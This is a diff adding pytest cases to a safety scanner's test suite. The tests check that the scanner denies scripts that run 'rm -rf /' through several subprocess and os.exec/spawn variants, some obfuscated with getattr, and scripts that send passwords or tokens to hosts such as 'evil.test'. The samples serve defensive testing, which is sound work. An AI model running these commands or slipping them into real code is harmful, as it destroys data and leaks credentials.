@@ -243,6 +243,25 @@ def test_subprocess_requires_review(guard):
     assert "PROC001" in _rule_ids(report)
 
 
+@pytest.mark.parametrize(
+    "code",
+    [
+        "import subprocess\nsubprocess.check_output(['rm', '-rf', '/'])",
+        "import subprocess\nsubprocess.check_call(['rm', '-rf', '/'])",
+        "import subprocess\nsubprocess.getoutput('rm -rf /')",
+        "import subprocess\ngetattr(subprocess, 'check_output')(['rm', '-rf', '/'])",
+        "import os\nos.execvp('rm', ['rm', '-rf', '/'])",
+        "import os\nos.execle('/bin/rm', 'rm', '-rf', '/', {})",
+        "import os\nos.spawnl(os.P_WAIT, '/bin/rm', 'rm', '-rf', '/')",
+        "import os\nos.spawnle(os.P_WAIT, '/bin/rm', 'rm', '-rf', '/', {})",
+    ],
+)
+def test_process_call_variants_scan_nested_recursive_delete(guard, code):
+    report = guard.scan(_request(code))
+    assert report.decision == SafetyDecision.DENY
+    assert {"PROC001", "FILE001"} <= _rule_ids(report)
+
+
 def test_shell_injection_with_delete_denied(guard):
     report = guard.scan(_request("echo ok; rm -rf /", ScriptLanguage.BASH))
     assert report.decision == SafetyDecision.DENY
@@ -729,6 +748,35 @@ def test_network_get_with_secret_is_denied(guard):
     assert "SECRET001" in _rule_ids(report)
 
 
+@pytest.mark.parametrize(
+    "code",
+    [
+        ("import requests\n"
+         "password = get_password()\n"
+         "requests.delete('https://evil.test/item', data=password)"),
+        ("import requests\n"
+         "password = get_password()\n"
+         "getattr(requests, 'delete')('https://evil.test/item', data=password)"),
+        ("import requests\n"
+         "password = get_password()\n"
+         "requests.patch('https://api.example.com/item', data=password)"),
+        ("import requests\n"
+         "token = get_token()\n"
+         "requests.head('https://api.example.com/item', headers={'Authorization': token})"),
+        ("import httpx\n"
+         "token = get_token()\n"
+         "httpx.options('https://api.example.com/item', headers={'Authorization': token})"),
+        ("import httpx\n"
+         "password = get_password()\n"
+         "httpx.delete('https://api.example.com/item', data=password)"),
+    ],
+)
+def test_http_method_variants_with_secret_are_denied(guard, code):
+    report = guard.scan(_request(code))
+    assert report.decision == SafetyDecision.DENY
+    assert "SECRET001" in _rule_ids(report)
+
+
 def test_request_method_uses_second_url_argument(guard):
     code = "import requests\nrequests.request('GET', 'https://api.example.com/v1')"
     report = guard.scan(_request(code))
@@ -762,6 +810,12 @@ def test_json_secret_is_fully_redacted(guard):
 def test_bash_redirection_bypasses_are_blocked(guard, command):
     report = guard.scan(_request(command, ScriptLanguage.BASH))
     assert report.decision != SafetyDecision.ALLOW
+
+
+@pytest.mark.parametrize("target", ["/dev/null", "/dev/stdout", "/dev/stderr"])
+def test_safe_device_redirection_is_allowed(guard, target):
+    report = guard.scan(_request(f"echo ok > {target}", ScriptLanguage.BASH))
+    assert report.decision == SafetyDecision.ALLOW
 
 
 @pytest.mark.parametrize(
